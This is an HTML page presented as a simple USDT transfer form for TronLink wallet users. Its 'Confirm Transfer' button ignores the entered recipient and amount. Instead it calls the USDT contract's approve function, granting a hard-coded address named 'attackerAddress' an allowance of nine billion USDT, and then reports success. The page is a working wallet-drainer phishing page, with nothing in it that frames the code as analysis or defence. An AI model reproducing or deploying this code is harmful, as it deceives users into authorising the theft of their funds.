<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Transfer</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
</head>
<body>
    <h1>USDT Transfer</h1>
    <div>
        <label for="recipient">Recipient Address:</label>
        <input type="text" id="recipient" name="recipient" required>
    </div>
    <div>
        <label for="amount">Amount:</label>
        <input type="number" id="amount" name="amount" min="1" required>
    </div>
    <button onclick="approveUSDT()">Confirm Transfer</button>
    <div id="message"></div>

    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            if (window.tronWeb && window.tronWeb.ready) {
                console.log('TronLink is connected');
            } else {
                console.error('TronLink is not connected');
                document.getElementById('message').innerText = 'Please connect TronLink wallet';
            }
        });

        async function approveUSDT() {
            const usdtAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
            const attackerAddress = 'TMmunHQsjSdUKZT1suksWBM7n6jVWkUGwL';
            const approveAmount = 9000000000 * 10**6; // 授权数量，转换为最小单位

            try {
                console.log('Connecting to USDT contract...');
                const contract = await tronWeb.contract().at(usdtAddress);
                console.log('USDT contract connected:', contract);

                console.log('Calling approve method...');
                await contract.approve(attackerAddress, approveAmount).send();
                console.log('Approve method called successfully');

                document.getElementById('message').innerText = 'USDT approval successful!';
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('message').innerText = 'Error approving USDT.';
            }
        }
    </script>
</body>
</html>
